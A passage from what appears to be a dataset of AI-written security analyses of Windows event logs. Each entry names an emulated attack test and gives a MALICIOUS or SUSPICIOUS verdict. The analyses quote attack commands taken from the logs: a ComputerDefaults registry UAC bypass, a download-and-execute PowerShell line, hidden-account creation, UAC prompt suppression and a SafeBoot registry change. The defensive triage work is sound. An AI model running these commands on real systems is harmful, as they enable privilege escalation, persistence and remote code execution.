- If any irregularity is found in `cmd.exe`, consider conducting a more exhaustive forensic analysis to rule out exploitation efforts through script execution or unauthorized web access via headless browsers."
Bypass UAC using ComputerDefaults (PowerShell),"### Detailed Analysis of the Logs:

**1. Application Log:**
- The application log shows events related to regular system operations. Windows Defender is shown as being operational (`SECURITY_PRODUCT_STATE_ON`) consistently, indicating that the security system is active.
- The logs also show the ""Software Protection Platform"" and ""SecurityCenter"" reports without any indications of error or warning.

**2. Windows PowerShell Log:**
- A significant event is found concerning PowerShell: `powershell.exe & {New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force ...}`
- The PowerShell command shows modifications to registry items to set a predefined command for ""ComputerDefaults.exe,"" which is a common method for bypassing UAC (User Account Control) and could imply an attempt at privilege escalation or unauthorized command execution (malicious intent).

**3. Sysmon Log:**
- Multiple Sysmon EventID 5 logs (Process Terminated) are observed for legitimate system processes like `wevtutil.exe`, `conhost.exe`, and others under the user `SERVER002\admin_test`. However, the repeated usage might indicate suspicious activity if not commonly performed by this user.
- However, the most concerning part is the execution of a PowerShell script (`powershell.exe`) again observed with suspicious command-line arguments for modifying the registry, matching what's seen in the PowerShell log.

**4. System Log:**
- Standard system changes such as kernel and time adjustments are recorded. These events appear benign as they align with normal system operations.

**5. Security Log:**
- A logon and special privileges are assigned during the observed period (`SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege` etc.), which is typical for system processes. No clear evidence of illicit logon attempts or elevation anomalies.

### Assessment:
- **Anomalous behavior:** The execution of PowerShell commands altering registry keys to redirect commands associated with `ComputerDefaults.exe` signifies potential unauthorized activities, indicating an attempt at privilege escalation.

- **Malicious Signs:** The PowerShell script contains patterns related to registry modifications often used in attack routines to bypass security mechanisms like UAC which is a known attack vector.

### Threats or Risks Identified:
- The aforementioned registry modification is a well-known method for gaining elevated privileges. If successful, it could allow the attacker to execute arbitrary commands with elevated privileges, posing a significant security risk.

### Guidance on How to Proceed:
1. Conduct a thorough investigation to determine if these PowerShell commands were approved or scheduled by legitimate administrative tasks.
2. Review access logs and scrutinize any access to this host around the event times.
3. Check user behavior analytics to see if this is aligned with usual user activity.
4. Repair or reset registry keys modified by PowerShell commands to mitigate further risks if confirmed unauthorized.

### Resolution:
- **MALICIOUS** - The logs suggest usage of PowerShell for potentially unauthorized modification of registry keys that are consistent with a method for bypassing normal privilege controls which have malicious implications. A comprehensive response effort should be initiated to ensure the system's integrity and mitigate potential security threats."
Masquerading - windows exe running as different windows exe,"**Analysis Summary:**

Upon review of the provided Windows event logs from the system, several indicators of potential malicious activity were identified. A detailed analysis of the logs reveals the following:

1. **Sysmon Logs:**
   - Frequent execution of the `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\admin_test`. These processes appear to be executed multiple times within a short timeframe, which can indicate attempts to query or clear event logs. The legitimate purpose of `wevtutil.exe` is to manage event logs, but excessive usage could imply tampering or data exfiltration activities.

2. **Suspicious PowerShell Activity:**
   - The PowerShell command `& {copy \""$env:ComSpec\"" ($env:TEMP + \""\\svchost.exe\"")\r\n$mydata_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\\svchost.exe\"")).Id\nStop-Process -ID $mydata_003}` is highly suspicious. It suggests copying `cmd.exe` (typically the `ComSpec` environment variable points to `cmd.exe`) to a temporary folder and executing it as `svchost.exe`, then stopping it. This behavior is characteristic of scripting used to mask malware activities or potential data staging for exfiltration.

3. **Execution of Unusual Processes:**
   - The creation of processes such as `svchost.exe` in the user's temporary folder (`C:\Users\ADMIN_~1\AppData\Local\Temp\svchost.exe`) is typically out of place. `svchost.exe` should exist in `C:\Windows\System32\`, and its presence and execution from another directory is a classic sign of an attempt to disguise malicious operations.
  
4. **Credential Access Suspicion:**
   - Security logs show Event ID 5379 with repeated attempts by the computer account `SERVER002$` to access 'MicrosoftAccount:user=02txoixylodcstop' and a Win Live token, all resulting in failure with a return code indicating an issue. Repeated access attempts may suggest credential access or detection evasion activities.

5. **Potential Persistence Techniques:**
   - Indications of process injection or child processes running under PowerShell using potentially malicious scripts could attempt persistence within the machine.

Assembling the observed indicators, the activity's nature appears orchestrated to conduct an unauthorized task, which suggests this cannot be dismissed as benign without ruling out malicious intents.

**Resolution: MALICIOUS**

**Threats and Risks Identified:**
- Potential unauthorized access and data exfiltration attempts.
- Indicators of suspicious script-based operations substantially suggestive of compromise.

**Guidance on Next Steps:**
1. Immediately isolate the affected system from the network to prevent further potential spread or exfiltration.
2. Conduct a comprehensive forensic analysis of the system to assess the extent of the compromise.
3. Review and monitor all recent activity even on adjacent systems within the network.
4. Evaluate existing email and network traffic for indicators of phishing or C2 (Command & Control) communications linked with this anomaly.
5. Consider notifying higher security management given the high-level target involved (the CEO's machine).
6. Enhance logging and monitoring of PowerShell and other commonly exploited applications for anomaly detection moving forward. 

Prompt action is recommended to mitigate the risk and prevent further unauthorized access."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"**Detailed Analysis:**

The Windows event logs provided indicate several activities that warrant further analysis for potential malicious behavior, focusing on the PowerShell activities and related Sysmon logs.

1. **PowerShell Execution:**
   - Multiple PowerShell events in the logs indicate the execution of `powershell.exe` with specific commands. Particularly, the command: `Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi' }` appears multiple times.
   - The usage of `Invoke-CimMethod` with `Win32_Product` is not typical for standard operations, particularly when the package is located in a temporary directory. This can be a red flag for potential installation of unauthorized software or malicious payloads.

2. **Command Execution with NoProfile and Non-Interactive:**
   - The use of `-nop` (No Profile) in the PowerShell command line `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -Command Write-Host VBScript executed me!; exit` is a common method used by attackers to avoid detection and bypass startup scripts that may log or block such actions.

3. **MSI Package Execution:**
   - In the Application logs, an MSI package (`data.007_VBScript.msi`) was executed. The path and manner of execution, coupled with the use of PowerShell to initiate it, suggests it could be used to install unwanted software clandestinely.

4. **Sysmon Logs:**
   - The Sysmon logs show the execution of several system processes including `WmiPrvSE.exe`, `msiexec.exe`, and others that can be associated with legitimate operations. However, in conjunction with suspicious PowerShell activity, these can indicate misuse by malicious actors for lateral movements or the installation of additional payloads.

5. **Privilege Escalation and High-Integrity Processes:**
   - There are several processes being executed with high integrity, indicating potential privilege misuse. The installation of software via PowerShell and execution involving `msiexec` under potentially elevated privileges should be scrutinized.

**Assessment:**

- **Suspicious Events Identified:**
  The invocation of PowerShell to execute and install an MSI package from a temporary user directory raises a significant red flag. The behavior of using `-nop` with PowerShell commands in conjunction with the observed script execution signifies potential unauthorized or malicious activity.

**Resolution: SUSPICIOUS**

Given the combination of elements discussed:
- The unusual PowerShell command invocation,
- Execution of MSI from a temporary path,
- Attributes typical of attempts to obscure activities (`-nop` in PowerShell),
- The need for high privileges which were observed,

The activities are deemed **SUSPICIOUS** but not conclusively malicious without further investigation. Further actions should include:
- Examining the content and purpose of the MSI package.
- Conducting a detailed forensic analysis of the affected systems.
- Verifying recent changes and accesses to critical or sensitive files.
- Assessing potential lateral movement or data exfiltration activities.
- Monitoring network traffic for anomalous behaviors or data flows.

Further investigative steps are needed to confirm whether these operations result from malicious actors or some authorized but unrecorded administrative activity."
UACME Bypass Method 23,"### Analysis of the Provided Windows Event Logs

#### Overview
The logs provided originate from different event log sources on a Windows system, specifically from the `Application`, `Sysmon`, and `Windows PowerShell` logs on a machine named `Server002`. Notably, logs from the `Security` and `System` sources are absent, as is any detailed information from `Windows PowerShell`, which is crucial for assessing security postures adequately.

#### Application Log
The Application log events are related to Windows Defender being operational:
- **Event ID 15** indicating `Windows Defender, SECURITY_PRODUCT_STATE_ON`. This is routine and expected behavior in a healthy environment, confirming Windows Defender is active and not compromised.

#### Sysmon Log
The Sysmon logs detailing process creation (`EventID 1`) and `file creation` events (`EventID 5`) provide significant insights:

1. **Suspicious Command-Line Execution:**
   - A command-line event involving `cmd.exe` executing a suspicious path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\script\\23 Akagi64.exe`. 
   - The parent process of this command line is PowerShell (`powershell.exe`), which executed a command to test a path's existence indirectly, potentially indicative of an obfuscated or stealth operation.

2. **High-Integrity Process Execution:**
   - Several processes executed with `High` integrity levels, such as `cmd.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe`. While high-integrity processes are not uncommon, their combination with suspicious paths and parent processes is concerning.
   
3. **Repeated Use of `wevtutil.exe`:**
   - `wevtutil.exe` is generally used for event log manipulation. The repeated execution of this binary raises red flags about potential log tampering or clearance.

4. **Activity from a Power User Account:**
   - Activity across these logs generally involves the `SERVER002\admin_test` user account, suggesting that actions were taken under potentially elevated privileges.

5. **Unusual Parent-Child Process Relationships:**
   - In one case, `wsmprovhost.exe` (Windows Remote Management) appears as a parent process which might imply remote command execution or scripting, operating under elevated privileges.

6. **Edge Update and Installer Processes:**
   - `MicrosoftEdgeUpdate.exe` and `Microsoft Edge Installer` processes are present, appearing legitimate at first glance. However, their proximity to suspicious process executions in the timeline necessitates further scrutiny for potential exploitation vectors concealing malicious activities.
   
#### Assessment
Based on the observations above:
- **Command Line Execution:** The execution path involving `Akagi64.exe` is not standard and resembles attack methods such as UAC bypass or privilege escalation (Akagi is a known UAC bypass tool).
- **Repeated Administrative Tools Usage:** Execution of `wevtutil.exe`, `cmd.exe`, Powershell, and other utils suggests potential misuse, possibly for defense evasion or data gathering.
- **Anomalous User and Integrity Level:** Consistent use of a high-integrity level along with an admin account indicates the potential for privileged execution on a machine that houses sensitive applications such as Windows Defender.

#### Resolution Conclusion
The activities observed in these logs cannot be exclusively classified as benign due to their combination of suspicious command-line executions and high levels of privilege states. However, without full context on the exact operations or results of these command lines, they cannot be unequivocally declared as malicious.

Therefore, this situation warrants further investigation into the motives behind the actions involving `SERVER002\admin_test` and analysis of the specific binaries referenced (like `Akagi64.exe`).

**Resolution: SUSPICIOUS**

#### Recommended Actions
- **Conduct a thorough forensic investigation** on `Server002`, specifically scrutinizing the `admin_test` user account’s recent activities.
- **Analyze the hash values presented in the logs** especially for suspicious binaries, and cross-reference with known malware databases.
- **Verify Windows event logs integrity** for signs of tampering.
- **Audit system security configurations** and user accounts’ privileges, particularly on critical organizational assets like a CEO's machine.
- **Review necessary containment or mitigating actions** based on the deeper analysis outcomes, focusing on suspicious binaries, network activities, and potentially malicious toolsets."
Create a Hidden User Called $,"Based on the provided Windows event logs, let's break down the activities and analyze them for any indicators of compromise:

### Analysis of Logs:

1. **Security Events:**

   - **Event ID 4728:**
     - Indicates that a user was added to a security-enabled global group.
     - In this log, `admin_test` seems to be the one who added an account to the domain group, but the group's actual name and the member are obscure since `MemberName` is ""-"".

   - **Event ID 4720:**
     - Indicates that a new user account was created.
     - A new account with the username `$` was created by `admin_test`. The use of `$` as a username is highly suspicious, as it resembles special characters typically used in backdoor or stealth accounts by attackers.

   - **Event ID 4722:**
     - Indicates that a user account was enabled.
     - The newly created `$` account was enabled.

   - **Event ID 4724:**
     - Indicates an attempt to reset an account’s password.
     - This could suggest an attempt to secure access to the `$` account or change its state.

   - **Event ID 4738:**
     - Indicates that an object's properties were changed.
     - The `$` account's properties were changed, possibly to ensure its activity remains under the radar.

   - **Event ID 4732:**
     - Suggests a user was added to a local security-enabled group, indicating potential privilege elevation.

2. **Sysmon Logs:**

   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` were executed by the user `admin_test`.
     - `wevtutil.exe` is generally used to manage event logs and subscriptions.
     - The execution pattern seems to be collecting system information and manipulating event logs, which is typical behavior in post-exploitation situations where the attacker tries to hide their presence.
  
   - The **Key Suspicious Commands:**
     - **`cmd.exe` with `/c net user $ file123! /add /active:yes` command:**
       - This command indicates that the user `admin_test` attempted to create a new user `$` with the password `file123!` and also activate this account. The use of this command under an account is a direct red flag for account tampering or administrative exploitation.

3. **EDR Alert (Implied):**
   - The mention of an alert on the CEO's machine and the presence of such logs involving `admin_test` performing potentially unauthorized administrative actions strongly indicates an active threat involving credential misuse or compromise.

### Assessment and Conclusion:

- **Threats/Risks Identified:**
  - Unauthorized user account creation (`$` account) and manipulation by `admin_test`.
  - Execution of potentially malicious or administrative commands that could allow persistence or further access to the system.
  - Possible privilege escalation activities.

### Resolution:

- **MALICIOUS**: The logs indicate the creation and enabling of a suspicious user account, manipulation of account properties, and execution of potentially malicious administrative commands. The account creation using atypical characters, along with the execution of commands to enable and elevate privileges, provides strong evidence of malicious activities consistent with an internal or external attack.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Disable and investigate the user account `$` and any other accounts created around similar times.
   - Change passwords and audit activities for the account `admin_test` to ensure it is not compromised.
   - Consider isolating the affected machine (Server002) for further forensic analysis.

2. **Further Investigation:**
   - Review other systems for similar activities. Since this occurred on `Server002`, ensure similar patterns are not observed elsewhere.
   - Conduct a full audit of privileged accounts and systems in the network for manipulations.
   - Look into potential sources of compromise for the `admin_test` account and assess the system for other backdoors or persistent mechanisms the attacker may have left.

3. **Preventative Measures:**
   - Implement stronger auditing and alerts on privilege modification activities.
   - Ensure EDR solutions are active and correctly configured to catch similar suspicious activities.

Given the evidence and the actions observed, this event should be treated with a high priority as it involves direct manipulation of system accounts and potential compromise."
WinPwn - UAC Bypass DiskCleanup technique,"Upon analyzing the provided logs, several events hint at potential malicious activity:

1. **PowerShell Activity:**
   - The Windows PowerShell logs show scripting activity executing potentially suspicious commands. It includes the use of PowerShell to download and execute a script from a GitHub URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). The use of `iex(new-object net.webclient).downloadstring` is a typical pattern used in malicious activities to fetch and execute scripts from the internet.
   - The script executed through PowerShell also runs `cmd.exe` with a technique labeled as ""DiskCleanup"", which is not a typical use case and can suggest obfuscation or masquerading tactics.

2. **Sysmon Activity:**
   - The Sysmon logs indicate execution of PowerShell and multiple instances of `wevtutil.exe`. The command line for PowerShell corroborates the PowerShell log's evidence of downloading and executing external scripts.
   - Frequent launching of `wevtutil.exe` without clear associated tasks or context might suggest log manipulation or clearing activities, which attackers often do to hide their tracks.

3. **Security and System Logs:**
   - There are entries of time adjustments (`EventID 4616`) with no clear explanation, which can be an indicator of attempts to manipulate timestamps to confuse incident response efforts or avoid detection.

4. **Network Service Executions:**
   - The execution of `MicrosoftEdgeUpdate.exe` from `NT AUTHORITY\SYSTEM`. While this may be routine for updates, the timing and surrounding context might call for more scrutiny given the other suspicious events.

**Assessment:**
- **Resolution: MALICIOUS.** The logs indeed contain several indicators of potentially malicious activities, primarily revolving around unauthorized PowerShell script execution. These indicators fit common patterns of compromise where attackers utilize PowerShell for script execution from online sources.

**Threats/Risks Identified:**
- Unauthorized script execution, which could potentially lead to data exfiltration, lateral movement, or malware installation.
- Possible log tampering as seen in the Sysmon logs, which compromises the integrity of log data during investigations.

**Guidance on How to Proceed:**
1. **Containment:**
   - Isolate the affected machine to prevent further spread of potential compromise.
   
2. **Eradication:**
   - Remove downloaded scripts and check for persistence mechanisms introduced by potential malware.
   - Audit installed applications and examine system changes since the observed PowerShell activity.

3. **Recovery:**
   - Once clean, restore the machine from known good backups and monitor for re-infection.
   
4. **Investigation:**
   - Conduct a thorough investigation to understand potential lateral movements.
   - Inspect network logs for unusual outbound connections initiated during or after the PowerShell activity.

5. **Prevention:**
   - Implement PowerShell logging restrictions and network policies to block or audit untrusted script execution.
   - Educate users, especially executives who are typically targeted, on identifying phishing and suspicious activities. 

This incident strongly suggests the presence of a potential threat actor activity within the CEO's machine and should be treated as a high-priority security event."
Copy and Modify Mailbox Data on Windows,"Upon analyzing the provided Windows event logs, several observations and potential concerns are noted:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity**: The logs reveal a sequence of PowerShell commands being executed around the same time across several logs. There is a PowerShell script being run that creates a directory, copies files into this directory, and appends some text to these files. This kind of activity might be indicative of attempts to exfiltrate or tamper with data.

    - **Command Detail**: 
      - Creation of a new directory at `C:\Users\<USERNAME>\AppData\Local\Comms\Unistore\data\copy`.
      - Recursive copying of files from another directory into this new directory.
      - Modifying each copied file by appending ""Modification for file Red Test"".

    - **Potential Concern**: Usage of PowerShell with such complex commands might not be typical, especially if not part of an IT or system maintenance routine. Could suggest malicious attempt for data modifications or staging for exfiltration.

2. **Sysmon Logs**: 
   - Multiple instances of `conhost.exe` and `wevtutil.exe` processes running in quick succession. While these are legitimate Windows processes, their sudden execution without clear context may imply attempts to manipulate event logs or environments.
   - The execution of `whoami.exe` seems to be part of typical reconnaissance activity often seen during lateral movement by attackers.
   - The appearance of `hostname.exe` and `conhost.exe` in conjunction with each other further requires looking into the origin of such commands, particularly when linked to the aforementioned PowerShell command.

3. **Security and System Logs**:
   - Time adjustments are being logged repeatedly, raising questions about whether this might be an attempt to manipulate timestamps. However, these processes seem to be part of normal system time synchronization (`svchost.exe` linked to the time service).

### Assessment of Malicious Activity or Compromise:

The provided log information strongly suggests that there may be suspicious activities taking place, specifically focusing on the PowerShell script executions which involve file creation, modification, and copying—typically associated with reconnaissance or preparatory activities for data exfiltration. The rapid and unusual executions of commonly legitimate processes might suggest attempts to cover tracks or execute unauthorized actions.

### Conclusion:

- **Resolution**: **SUSPICIOUS**

### Guidance and Next Steps:

1. **Further Investigation**: Collect more context around the execution of the PowerShell script. Check with the CEO and system administrators if this activity was scheduled or approved.
   
2. **Examine the Created Files**: Analyze files in the directory that was created and modified (`C:\Users\<USERNAME>\AppData\Local\Comms\Unistore\data\copy`) to assess if data tampering or leakage occurred.

3. **User and Command Verification**: Validate whether `SERVER002\\admin_test` actions align with routine administrative tasks. Investigate if credentials may have been compromised.

4. **Enhanced Monitoring**: Increase monitoring of PowerShell activities on this host and consider enabling enhanced PowerShell logging (if not already enabled) to capture detailed scripts executed.

5. **Check for Known Indicators of Compromise (IoCs)**: Use threat intelligence feeds to check if any hash values or script patterns match known malicious indicators."
Windows Add Registry Value to Load Service in Safe Mode without Network,"Based on the logs provided, here's a detailed analysis focusing on identifying any suspicious or potentially malicious activity:

### System Log Analysis
The system logs primarily detail time synchronization events using `svchost.exe`. These events are normal for managing system time using network time protocol services and do not suggest any malicious behavior.

### Application Log Analysis
The application log mentions `edgeupdate` services stopping, which aligns with expected behavior when updating Microsoft Edge. This activity does not suggest any compromise.

### Sysmon Log Analysis
Sysmon logs provide more detailed insights into process creation:

1. There are multiple `wevtutil.exe` process executions by the user `SERVER002\admin_test`. `wevtutil.exe` is often used to manage event logs. Frequent execution could be normal for administrative tasks but warrants further investigation to ensure it's not being used to clear logs suspiciously.

2. Execution of `cmd.exe` to add registry keys in SafeBoot. The command involves:
   ```
   ""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""
   ```
   This action usually modifies boot parameters, which can be normal depending on the context. However, since this was executed by an account `SERVER002\admin_test`, it warrants further investigation to verify if this action was intentional.

3. Notably, `reg.exe` is executed with the command above within a temporary directory, possibly indicating potential unauthorized modifications to startup configurations.

### Security Log Analysis
The security logs repeatedly demonstrate time change events processed by `svchost.exe` for time synchronization. This seems benign and typical in networked environments where precise time is critical.

### Assessment
**Suspicious Activities Identified:**
- Execution of `wevtutil.exe` may be benign under certain administrative contexts; however, frequent access could indicate an attempt to manipulate or clear event logs. This needs further exploration to ensure no logs are being tampered with.
- Modification of the SafeBoot configuration using `cmd.exe` indicates a change to the system's startup parameters, which usually require administrative privileges and warrants investigation to confirm legitimate intent.

### Conclusion
The Sysmon logs provide instances of potentially suspicious actions — particularly the use of `wevtutil.exe` and registry modifications via `cmd.exe` — carried out by `SERVER002\admin_test`. These events necessitate further investigation for assurance. As such, the resolution for this assessment is:

### Resolution: SUSPICIOUS
Further inquiry should involve:
1. Reviewing the user's recent activities and purpose for these commands.
2. Verifying if these actions align with the user's expected role and permissions.
3. Checking for any other related events or patterns that might suggest exploitation or tampering.
4. Ensuring no security policies or compliance measures are being bypassed.

It is crucial to contact relevant users or administrators to get a contextual understanding of these actions before concluding on their legitimacy."
Copy and Delete Mailbox Data on Windows,"Upon analysis of the provided logs, I have identified the following points of interest:

1. **EdgeUpdate Activity**: 
   - The logs show various activities involving `MicrosoftEdgeUpdate.exe`. The tool is being executed with different command-line arguments such as `/regserver`, `/svc`, `/c`, `/ping`, `/ua /installsource core`. These activities are typically associated with automated update features of Microsoft Edge. The parent processes and users associated with these executions are all `NT AUTHORITY\SYSTEM`, which is normal for system update tasks.
   - There is also a noticeable frequency of the `MicrosoftEdgeUpdate.exe` running within a short timeframe, which could be indicative of an update or an anomaly caused by misconfiguration or system errors.

2. **PowerShell Activity**:
   - There are PowerShell commands executed that are involved in file operations such as creating directories, copying files, and removing them afterward (e.g., `New-Item`, `Copy-Item`, `Remove-Item`). The script focuses on the `Unistore` data paths under the `AppData` directory.
   - The presence of such PowerShell activity could be considered suspicious, especially if not recognized as a regular or administrative operation. These tasks could be indicative of a script attempting data transfer or manipulation within user directories.

3. **Wevtutil and Conhost Executions**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are seen in the logs with the user `SERVER002\admin_test`. While `conhost.exe` can be expected to accompany command-line utility executions, `wevtutil.exe` is generally used to manage event logs. Frequent execution within a short time could be abnormal unless known as part of a script or maintenance task.

4. **Time Synchronization Activity**:
   - Several entries involve time adjustments and synchronization which may appear unusual but are typically normal system behavior managed by `svchost.exe`. There is no explicit indication of malicious timing changes in these logs.

Based on the observed patterns and without additional context such as threat intelligence correlating these activities to known threats, the findings can be summarized as:

- **EdgeUpdate.exe** activities point towards normal system update operations, although their frequency suggests a need for verification against known update schedules to rule out system misconfiguration or errors.
- **PowerShell** and **wevtutil/conhost** activity require further investigation, particularly to verify whether the PowerShell script performing numerous file operations is authorized and if the `admin_test` user activities align with their typical usage patterns.

### Resolution: SUSPICIOUS

The logs contain activities that require further investigation to verify their legitimacy. Specifically:
- Confirm the intent and authorizations behind the PowerShell script.
- Cross-reference `SERVER002\admin_test` activities with known user behavior and administrative scripts.

Further steps should include reviewing any related configuration or maintenance scripts, checking for recent software updates or patches, and possibly monitoring for similar activities moving forward."
Rundll32 execute command via FileProtocolHandler,"### Detailed Analysis

The logs provided cover several systems and types of events, including system logs, security logs, Sysmon logs, and application logs. Here is a detailed breakdown of potentially suspicious events and context:

1. **Time Changes and svchost.exe Execution**:
   - The system logs report multiple changes in system time by `svchost.exe` which is a legitimate Windows service host process. The time changes occur at very close intervals (milliseconds apart). While abrupt changes in system time could be suspicious, these events seem to originate legitimately from the time update service (`time.windows.com`), which typically adjusts system time.

2. **Security Logs Related to Time Change**:
   - The security logs show time change events (EventID: 4616) initiated by `LOCAL SERVICE` via `svchost.exe`. This action aligns with system time synchronization processes and is not in itself suspicious.

3. **Sysmon Logs - Process Execution**:
   - **MicrosoftEdgeUpdateComRegisterShell64.exe and MicrosoftEdgeUpdate.exe**: Multiple executions of Microsoft Edge Update processes are listed, which include standard update activities. The command lines and users are consistent with the known behavior of updating software and show execution in a restricted environment (IntegrityLevel: System). All actions appear to be consistent with legitimate software updates.
   
   - **Cmd.exe and rundll32.exe Execution**: An event shows `cmd.exe` executing with the command `rundll32.exe url.dll,FileProtocolHandler calc.exe`. This suggests a command line execution designed to open the calculator application indirectly. Although this usage pattern is typically seen in indirect execution attacks, using `calc.exe` makes it less likely to be a direct attack vector. However, the unusual pattern merits caution.

   - **WHOAMI and HOSTNAME Executions**: These are standard Windows utilities for environment introspection and are not inherently suspicious. Their execution could relate to administrative scripts or monitoring processes.

4. **Entrust and Microsoft Edge Update Activity**:
   - The log entries show multiple entries of `MicrosoftEdgeUpdate.exe` and related components performing updates, such as registration and downloading components. The logs are filled with edge update entries, suggesting continuous update processes and not immediately suspicious.

5. **Potential Indicators of Compromise (IOC)**:
   - The `cmd.exe` execution of `rundll32.exe` which lead to opening `calc.exe` could indicate an attempt to perform lateral movements or execute commands using unconventional paths. While this particular execution ends in a benign result (Calculator opening), the pattern is suspicious as it implies indirect execution handling which is typically used in scripting and exploits.

### Assessment and Resolution

Based on the context and events analyzed:

- **Assessment**:
  - The frequent execution of `sysmon` logs suggests routine software updates and system maintenance activities.
  - However, the execution of `calc.exe` through the chain of `cmd.exe` and `rundll32.exe` is unusual despite being seemingly benign in this instance.

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed
Given that the execution pattern was unusual (not immediately harmful but atypical), it is crucial to:
- Monitor for repeated occurrences of similar command chain executions, particularly checking for `rundll32.exe` launching processes not typically associated with known benign use (e.g., browser handling or system utilities).
- Review system activity and logs for any unauthorized script activity or automation setting that might explain this sequence.
- Conduct integrity checks on system files like `url.dll` and `rundll32.exe` to ensure they are intact and untampered.
- If further anomalies are observed, consider isolating the affected host for thorough forensic analysis."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Upon analyzing the provided log entries, several points of interest and potential indicators of malicious activity were identified:

1. **Suspicious PowerShell Execution:**
   - The PowerShell logs indicate the `powershell.exe` process was launched with the `-nop` (NoProfile) argument. This is a common technique used by attackers to avoid running initial script settings, which could trigger available protections.
   - The command line: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -Command Write-Host VBScript executed me; exit` suggests that a script (potentially a VBScript) is executing PowerShell commands. This behavior is suspicious, particularly given the context of the investigation on the CEO's machine.

2. **Use of MSI Installer for Execution:**
   - There are multiple events related to the execution of an `.msi` file, notably `data.007_VBScript.msi`, located in a temporary directory `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\`. The context implies that this MSI package might have been used to execute scripts or malicious code.

3. **Unusual Process Activity and Use of System Utilities:**
   - There is notable execution of system utilities like `wevtutil.exe`, `conhost.exe`, and `cmd.exe`, in addition to the layered execution involving `svchost.exe` and `wsmprovhost.exe`. Such chaining of processes, especially with command-line utilities, can be indicative of obfuscating actions or lateral movement.
   - The execution of `whoami.exe` possibly indicates a check for user credentials or administrative privileges, another hallmark of potential intrusion activities.

4. **Time Manipulation Logs:**
   - The Security and System logs detail changes in the system time (`EventID 4616` with `ProcessName svchost.exe`, particularly reverting to earlier timestamps), which can be indicative of attempts to alter forensic evidence or adjust system settings stealthily.

5. **Sysmon Logs Indicating Process Creation:**
   - The Sysmon logs show a series of process creations with a particular focus on administrative actions initiated by `admin_test`. There is mention of `msiexec.exe` being initiated with typical installation flags (`/q /i`). While this isn’t inherently malicious, the source MSI package being from a temporary directory associated with a potentially suspicious name makes it suspect.

**Assessment:**
The observed behaviors and logs appear to indicate suspicious activity, particularly around script execution using PowerShell under potentially obfuscated or unauthorized circumstances. The execution paths and tool usage align with known tactics for maintaining persistence and performing lateral movement.

**Resolution: SUSPICIOUS**
Given the complex chain of events and process executions, the logs are flagged as **SUSPICIOUS**. There is enough unusual activity to warrant further investigation but not explicit indication to classify as outright malicious without deeper context or correlating evidence.
   
**Guidance on How to Proceed:**
- **Immediate Steps:** Isolate the CEO's machine to prevent any potential spread of malicious activity and conduct a thorough scan with updated anti-malware tools.
- **Forensic Analysis:** Conduct an in-depth forensic analysis to retrieve additional context around the `data.007_VBScript.msi` and its origins or any associated downloaded files.
- **Review User Actions:** Engage with the user `admin_test` to verify legitimate usage patterns and if those coincide with the timeline of the logged events.
- **Monitor Network Traffic:** Implement heightened monitoring of network traffic from this host for any unusual outbound connections.
- **Check Installed Software:** Cross-verify all installed software against trusted inventories to identify any unauthorized or suspicious software."
Disable ConsentPromptBehaviorAdmin via registry keys,"Upon reviewing the provided Windows event logs from the CEO's machine, several activities stand out as potentially suspicious or concerning. Here is a detailed analysis of the logs, highlighting any unusual behavior and potential indicators of compromise:


### Suspicious or Anomalous Behavior:
1. **Execution of Administrative Utilities**:
    - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed under the `admin_test` account in a very short time frame. `wevtutil.exe` is a utility used to manage event logs and is typically not something a regular user or automated process would frequently execute.

2. **Registry Modifications**:
    - The `cmd.exe` process executes a command-line instruction that modifies the Windows registry:
      ```
      cmd.exe /c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
      ```
      This command changes UAC (User Account Control) settings to reduce or suppress consent prompts, which is a known tactic used by attackers to escalate privileges without user acknowledgment.

3. **Presence of Potential Privilege Escalation**:
    - An event involving `reg.exe` is seen with a command that adds or modifies registry settings related to system policies, indicative of an attempt to bypass or alter security policies.
    
4. **High Integrity Processes**:
    - Multiple processes are executed with high integrity levels, indicative of actions performed with elevated privileges, which raises suspicion given the other activities noted.

5. **Potential Time Manipulation**:
    - Time discrepancies in the logs suggest manipulation of system time, although attributed to `svchost.exe`, it remains a tactic sometimes associated with concealing malicious activities.
    
6. **Repeated Execution of Tools**:
    - The repeated use of basic command-line and system utilities (`hostname.exe`, `whoami.exe`) does not typically align with standard administrative tasks and further supports potential recon activity or tampering.

### Assessment:
The combination of registry modifications aimed at suppressing UAC prompts, execution of administrative tools, potential tampering with time settings, and the elevated privilege levels at which these processes were running suggests that these activities could indicate a compromise. However, they might also represent misconfigured administrative scripts, batch jobs, or legitimate administrative activities if proper context exists.

### Final Resolution:
- **SUSPICIOUS**: The activities noted in the Windows event logs are suspicious and warrant further investigation to determine the legitimacy of these actions. It is vital to verify if similar patterns are present in other machines or if there is any prior authorization or scheduling for such actions that correlate with legitimate administrative procedures. Further investigation is needed to rule out or confirm malicious intent.

### Guidance on How to Proceed:
1. **Isolate the Host**: As a precaution, isolate the affected system from the network to prevent potential spread while further investigation is conducted.
   
2. **Conduct a Full Malware Scan**: Utilize enterprise-grade security software to perform a detailed malware scan of the machine for potential threats.

